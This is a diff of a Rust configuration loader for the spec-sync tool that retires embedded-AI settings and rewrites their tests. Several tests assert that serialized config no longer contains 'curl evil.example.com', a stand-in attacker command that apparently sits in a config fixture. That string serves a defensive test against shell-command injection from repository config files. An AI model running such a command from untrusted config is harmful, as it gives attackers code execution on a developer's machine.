@@ -178,10 +178,8 @@ pub fn load_config_from_path(config_path: &Path, root: &Path) -> SpecSyncConfig 
 /// 3. `.specsync.toml` (legacy root TOML)
 /// 4. `specsync.json` (legacy root JSON)
 ///
-/// After loading the shared config, `.specsync/config.local.toml` is merged
-/// on top (if it exists). This file is gitignored and holds per-developer
-/// overrides — particularly `ai_provider`, `ai_command`, and `ai_model` —
-/// so contributors using different AI agents don't conflict.
+/// After loading the shared config, `.specsync/config.local.toml` is read for
+/// migration diagnostics. Retired embedded-AI keys are ignored safely.
 pub fn load_config(root: &Path) -> SpecSyncConfig {
     let v4_toml = root.join(".specsync/config.toml");
     let v4_json = root.join(".specsync/config.json");
@@ -208,36 +206,16 @@ pub fn load_config(root: &Path) -> SpecSyncConfig {
 
     config.config_path = config_path;
 
-    // Security: `ai_command` is executed via `sh -c` (see ai::run_cli_command).
-    // It must NEVER be honored from a file on disk — committed config, or a
-    // local file, can all be attacker-supplied (git clone, ZIP/tarball download,
-    // release archive, or extraction into an existing work tree), yielding
-    // arbitrary code execution on `check --fix` / `generate`. The only trusted
-    // source is the SPECSYNC_AI_COMMAND environment variable, which cannot ride
-    // inside a repo (read directly in ai::resolve_ai_provider). So strip any
-    // ai_command loaded from committed config here; the local merge below
-    // likewise refuses it. Other ai_* fields are not shell-executed.
-    if config.ai_command.take().is_some() {
-        eprintln!(
-            "Warning: `ai_command` in config is ignored for security (it runs a shell command). \
-             Set the SPECSYNC_AI_COMMAND environment variable instead."
-        );
-    }
-
-    // Merge local overrides (per-developer config): ai_provider/ai_model/etc.
-    // (merge_local_config refuses ai_command for the same security reason.)
+    // Read the old local override file only to surface migration guidance.
     let local_toml = root.join(".specsync/config.local.toml");
     if local_toml.exists() {
-        merge_local_config(&local_toml, &mut config);
+        inspect_legacy_local_config(&local_toml);
     }
 
     config
 }
 
-/// Merge a local config file on top of an existing config.
-/// Only fields explicitly set in the local file override the shared config.
-/// This lets each developer set their own `ai_provider`, `ai_command`, etc.
-/// without conflicting in the shared `config.toml`.
+/// Inspect a legacy local config file and ignore all retired embedded-AI keys.
 ///
 /// NOTE: this is a second, deliberately minimal line-by-line reader. It handles
 /// only SCALAR keys (ai_* and a few strings) — it does NOT support multi-line
@@ -246,17 +224,17 @@ pub fn load_config(root: &Path) -> SpecSyncConfig {
 /// is ever added to local config, route it through the shared array handling
 /// (`find_toml_array_close` accumulation) to avoid re-introducing `["["]`
 /// corruption.
-fn merge_local_config(local_path: &Path, config: &mut SpecSyncConfig) {
+fn inspect_legacy_local_config(local_path: &Path) {
     let content = match read_config_file(local_path) {
         Some(c) => c,
         None => {
             // Local config is optional, but a file that exists yet cannot be read
             // (not valid UTF-8) must not be silently ignored — its per-developer
-            // overrides (ai_provider/ai_model/etc.) would be dropped with no signal.
+            // retired settings would be dropped with no signal.
             if local_path.exists() {
                 eprintln!(
                     "Warning: local config {} exists but could not be read (not valid UTF-8 or unreadable); \
-                     per-developer overrides are NOT applied",
+                     retired embedded-AI settings are NOT inspected",
                     local_path.display()
                 );
             }
@@ -279,43 +257,15 @@ fn merge_local_config(local_path: &Path, config: &mut SpecSyncConfig) {
 
         if let Some(eq_pos) = line.find('=') {
             let key = line[..eq_pos].trim();
-            let value = line[eq_pos + 1..].trim();
-
-            let value = strip_inline_comment(value);
-
-            // Skip section-specific keys in local config (only top-level AI fields make sense)
+            // Only legacy top-level AI fields were supported in local config.
             if current_section.is_some() {
                 continue;
             }
 
             match key {
-                "ai_provider" => {
-                    let s = parse_toml_string(&value);
-                    config.ai_provider = crate::types::AiProvider::from_str_loose(&s);
-                }
-                "ai_model" => config.ai_model = Some(parse_toml_string(&value)),
-                "ai_command" => {
-                    // Security: `ai_command` runs `sh -c`, so it is never honored
-                    // from any file on disk (which can be attacker-supplied via
-                    // clone, tarball, or extraction into your tree). Only the
-                    // SPECSYNC_AI_COMMAND environment variable is trusted.
-                    eprintln!(
-                        "Warning: `ai_command` in config.local.toml is ignored for security \
-                         (it runs a shell command). Set the SPECSYNC_AI_COMMAND environment \
-                         variable instead."
-                    );
-                }
-                "ai_api_key" => config.ai_api_key = Some(parse_toml_string(&value)),
-                "ai_base_url" => config.ai_base_url = Some(parse_toml_string(&value)),
-                "ai_timeout" => {
-                    if let Ok(n) = value.trim().parse::<u64>() {
-                        config.ai_timeout = Some(n);
-                    }
-                }
+                key if LEGACY_AI_TOML_KEYS.contains(&key) => warn_retired_ai_key(key),
                 _ => {
-                    eprintln!(
-                        "Warning: unknown key \"{key}\" in config.local.toml (only ai_* keys are supported)"
-                    );
+                    eprintln!("Warning: unknown key \"{key}\" in config.local.toml (ignored)");
                 }
             }
         }
@@ -466,28 +416,6 @@ pub fn config_to_toml(config: &SpecSyncConfig) -> String {
         crate::types::EnforcementMode::Strict => {
             lines.push("enforcement = \"strict\"".to_string());
         }
-    }
-
-    // AI settings
-    if let Some(ref provider) = config.ai_provider {
-        // `Display` is the canonical lowercase provider name.
-        lines.push(format!("ai_provider = \"{provider}\""));
-    }
-    if let Some(ref model) = config.ai_model {
-        lines.push(format!("ai_model = \"{}\"", toml_escape(model)));
-    }
-    if let Some(ref cmd) = config.ai_command {
-        lines.push(format!("ai_command = \"{}\"", toml_escape(cmd)));
-    }
-    if config.ai_api_key.is_some() {
-        eprintln!("[warn] ai_api_key found in config but NOT written to config.toml.");
-        eprintln!("       Set the AI_API_KEY environment variable instead.");
-    }
-    if let Some(ref url) = config.ai_base_url {
-        lines.push(format!("ai_base_url = \"{}\"", toml_escape(url)));
-    }
-    if let Some(timeout) = config.ai_timeout {
-        lines.push(format!("ai_timeout = {timeout}"));
     }
 
     if let Some(days) = config.task_archive_days {
@@ -662,10 +590,7 @@ pub fn config_to_toml(config: &SpecSyncConfig) -> String {
 /// a user's config on JSON→TOML conversion.
 ///
 /// Keep this in lockstep with `config_to_toml`: when a field gains real TOML
-/// round-trip support above, remove it here. `ai_api_key` is intentionally NOT
-/// listed — it is deliberately never written to disk (secrets belong in an env
-/// var) and `config_to_toml` already warns about it loudly, so it is not a silent
-/// loss.
+/// round-trip support above, remove it here.
 pub fn config_to_toml_lossy_fields(config: &SpecSyncConfig) -> Vec<&'static str> {
     let mut fields = Vec::new();
     if !config.custom_rules.is_empty() {
@@ -689,12 +614,6 @@ const KNOWN_JSON_KEYS: &[&str] = &[
     "exportLevel",
     "parseMode",
     "modules",
-    "aiProvider",
-    "aiModel",
-    "aiCommand",
-    "aiApiKey",
-    "aiBaseUrl",
-    "aiTimeout",
     "rules",
     "customRules",
     "taskArchiveDays",
@@ -703,6 +622,30 @@ const KNOWN_JSON_KEYS: &[&str] = &[
     "lifecycle",
     "companions",
 ];
+
+const LEGACY_AI_JSON_KEYS: &[&str] = &[
+    "aiProvider",
+    "aiModel",
+    "aiCommand",
+    "aiApiKey",
+    "aiBaseUrl",
+    "aiTimeout",
+];
+
+const LEGACY_AI_TOML_KEYS: &[&str] = &[
+    "ai_provider",
+    "ai_model",
+    "ai_command",
+    "ai_api_key",
+    "ai_base_url",
+    "ai_timeout",
+];
+
+fn warn_retired_ai_key(key: &str) {
+    eprintln!(
+        "Warning: retired embedded-AI config key `{key}` is ignored. spec-sync 5.0 generates deterministic scaffolds; use your coding agent to enrich them."
+    );
+}
 
 fn load_json_config(config_path: &Path, root: &Path) -> SpecSyncConfig {
     let content = match read_config_file(config_path) {
@@ -726,7 +669,9 @@ fn load_json_config(config_path: &Path, root: &Path) -> SpecSyncConfig {
         && let Some(obj) = raw.as_object()
     {
         for key in obj.keys() {
-            if !KNOWN_JSON_KEYS.contains(&key.as_str()) {
+            if LEGACY_AI_JSON_KEYS.contains(&key.as_str()) {
+                warn_retired_ai_key(key);
+            } else if !KNOWN_JSON_KEYS.contains(&key.as_str()) {
                 eprintln!("Warning: unknown key \"{key}\" in specsync.json (ignored)");
             }
         }
@@ -757,9 +702,6 @@ fn load_json_config(config_path: &Path, root: &Path) -> SpecSyncConfig {
 /// schema_dir = "db/migrations"
 /// exclude_dirs = ["__tests__"]
 /// exclude_patterns = ["**/*.test.ts"]
-/// ai_provider = "anthropic"
-/// ai_model = "claude-sonnet-4-6"
-/// ai_timeout = 120
 /// required_sections = ["Purpose", "Public API"]
 /// ```
 fn load_toml_config(config_path: &Path, root: &Path) -> SpecSyncConfig {
@@ -896,19 +838,7 @@ fn load_toml_config(config_path: &Path, root: &Path) -> SpecSyncConfig {
                 "exclude_dirs" => config.exclude_dirs = parse_toml_string_array(value),
                 "exclude_patterns" => config.exclude_patterns = parse_toml_string_array(value),
                 "source_extensions" => config.source_extensions = parse_toml_string_array(value),
-                "ai_provider" => {
-                    let s = parse_toml_string(value);
-                    config.ai_provider = crate::types::AiProvider::from_str_loose(&s);
-                }
-                "ai_model" => config.ai_model = Some(parse_toml_string(value)),
-                "ai_command" => config.ai_command = Some(parse_toml_string(value)),
-                "ai_api_key" => config.ai_api_key = Some(parse_toml_string(value)),
-                "ai_base_url" => config.ai_base_url = Some(parse_toml_string(value)),
-                "ai_timeout" => {
-                    if let Ok(n) = value.trim().parse::<u64>() {
-                        config.ai_timeout = Some(n);
-                    }
-                }
+                key if LEGACY_AI_TOML_KEYS.contains(&key) => warn_retired_ai_key(key),
                 "export_level" => {
                     let s = parse_toml_string(value);
                     match s.as_str() {
@@ -1676,13 +1606,11 @@ mod tests {
         let tmp = TempDir::new().unwrap();
         fs::write(
             tmp.path().join(".specsync.toml"),
-            "specs_dir = \"mydocs\" # where specs live\n\
-             ai_timeout = 120 # seconds\n",
+            "specs_dir = \"mydocs\" # where specs live\n",
         )
         .unwrap();
         let config = load_config(tmp.path());
         assert_eq!(config.specs_dir, "mydocs");
-        assert_eq!(config.ai_timeout, Some(120));
     }
 
     #[test]
@@ -1848,9 +1776,6 @@ exclude_dirs = ["__tests__"]
 exclude_patterns = ["**/*.test.ts"]
 source_extensions = [".ts", ".rs"]
 export_level = "type"
-ai_provider = "claude"
-ai_model = "opus"
-ai_timeout = 120
 required_sections = ["Purpose", "Public API"]
 task_archive_days = 30
 
@@ -1880,12 +1805,6 @@ verify_issues = false
             config.export_level,
             crate::types::ExportLevel::Type
         ));
-        assert!(matches!(
-            config.ai_provider,
-            Some(crate::types::AiProvider::Claude)
-        ));
-        assert_eq!(config.ai_model.as_deref(), Some("opus"));
-        assert_eq!(config.ai_timeout, Some(120));
         assert_eq!(config.required_sections, vec!["Purpose", "Public API"]);
         assert_eq!(config.task_archive_days, Some(30));
 
@@ -1971,7 +1890,7 @@ verify_issues = false
     // --- config.local.toml merging ---
 
     #[test]
-    fn test_local_config_overrides_ai_provider() {
+    fn test_retired_local_ai_keys_are_ignored() {
         let tmp = TempDir::new().unwrap();
         fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
         fs::write(
@@ -1986,19 +1905,12 @@ verify_issues = false
         .unwrap();
 
         let config = load_config(tmp.path());
-        assert!(matches!(
-            config.ai_provider,
-            Some(crate::types::AiProvider::Ollama)
-        ));
-        assert_eq!(config.ai_model.as_deref(), Some("llama3"));
-        // Non-AI fields unchanged
         assert_eq!(config.specs_dir, "specs");
+        assert!(!config_to_toml(&config).contains("ai_"));
     }
 
     #[test]
-    fn test_local_config_ai_command_is_ignored_but_other_ai_fields_apply() {
-        // Security: ai_command runs `sh -c`, so it is never honored from a file
-        // (config.local.toml included). Non-shell ai_* fields still merge.
+    fn test_local_ai_command_and_secret_are_not_retained() {
         let tmp = TempDir::new().unwrap();
         fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
         fs::write(
@@ -2008,17 +1920,14 @@ verify_issues = false
         .unwrap();
         fs::write(
             tmp.path().join(".specsync/config.local.toml"),
-            "ai_command = \"my-custom-agent --prompt\"\nai_model = \"llama3\"\n",
+            "ai_command = \"my-custom-agent --prompt\"\nai_api_key = \"sk-do-not-retain\"\n",
         )
         .unwrap();
 
         let config = load_config(tmp.path());
-        assert_eq!(config.ai_command, None, "local ai_command must be ignored");
-        assert_eq!(
-            config.ai_model.as_deref(),
-            Some("llama3"),
-            "other local ai_* fields still apply"
-        );
+        let serialized = config_to_toml(&config);
+        assert!(!serialized.contains("my-custom-agent"));
+        assert!(!serialized.contains("sk-do-not-retain"));
     }
 
     #[test]
@@ -2034,10 +1943,7 @@ verify_issues = false
         .unwrap();
 
         let config = load_config(tmp.path());
-        assert_eq!(
-            config.ai_command, None,
-            "committed ai_command must be ignored"
-        );
+        assert!(!config_to_toml(&config).contains("curl evil.example.com"));
     }
 
     #[test]
@@ -2051,10 +1957,7 @@ verify_issues = false
         .unwrap();
 
         let config = load_config(tmp.path());
-        assert_eq!(
-            config.ai_command, None,
-            "committed aiCommand must be ignored"
-        );
+        assert!(!config_to_toml(&config).contains("curl evil.example.com"));
     }
 
     #[test]
@@ -2063,19 +1966,16 @@ verify_issues = false
         fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
         fs::write(
             tmp.path().join(".specsync/config.toml"),
-            "specs_dir = \"specs\"\nsource_dirs = [\"src\"]\nai_provider = \"claude\"\n",
+            "specs_dir = \"specs\"\nsource_dirs = [\"src\"]\n",
         )
         .unwrap();
         // No config.local.toml — should load normally
         let config = load_config(tmp.path());
-        assert!(matches!(
-            config.ai_provider,
-            Some(crate::types::AiProvider::Claude)
-        ));
+        assert_eq!(config.specs_dir, "specs");
     }
 
     #[test]
-    fn test_local_config_works_with_legacy_json() {
+    fn test_legacy_json_and_local_ai_keys_are_ignored() {
         let tmp = TempDir::new().unwrap();
         fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
         fs::write(
@@ -2090,14 +1990,12 @@ verify_issues = false
         .unwrap();
 
         let config = load_config(tmp.path());
-        assert!(matches!(
-            config.ai_provider,
-            Some(crate::types::AiProvider::OpenAi)
-        ));
+        assert_eq!(config.specs_dir, "specs");
+        assert!(!config_to_toml(&config).contains("ai_"));
     }
 
     #[test]
-    fn test_local_config_strips_inline_comments() {
+    fn test_retired_local_config_with_inline_comments_is_ignored() {
         let tmp = TempDir::new().unwrap();
         fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
         fs::write(
@@ -2112,12 +2010,8 @@ verify_issues = false
         .unwrap();
 
         let config = load_config(tmp.path());
-        assert!(matches!(
-            config.ai_provider,
-            Some(crate::types::AiProvider::Ollama)
-        ));
-        assert_eq!(config.ai_model, Some("llama3".to_string()));
-        assert_eq!(config.ai_timeout, Some(60));
+        assert_eq!(config.specs_dir, "specs");
+        assert!(!config_to_toml(&config).contains("ai_"));
     }
 
     #[test]
@@ -2273,20 +2167,6 @@ verify_issues = false
         config.lifecycle.track_history = false;
         assert!(config_to_toml(&config).contains("track_history = false"));
         assert!(!roundtrip_toml(&config).lifecycle.track_history);
-    }
-
-    #[test]
-    fn test_config_to_toml_roundtrips_ai_provider_custom() {
-        // `custom` used to write `ai_provider = "custom"` but reload as None
-        // (from_str_loose had no arm) — a silent drop on migrate.
-        let config = SpecSyncConfig {
-            ai_provider: Some(crate::types::AiProvider::Custom),
-            ..SpecSyncConfig::default()
-        };
-        assert_eq!(
-            roundtrip_toml(&config).ai_provider,
-            Some(crate::types::AiProvider::Custom)
-        );
     }
 
     #[test]
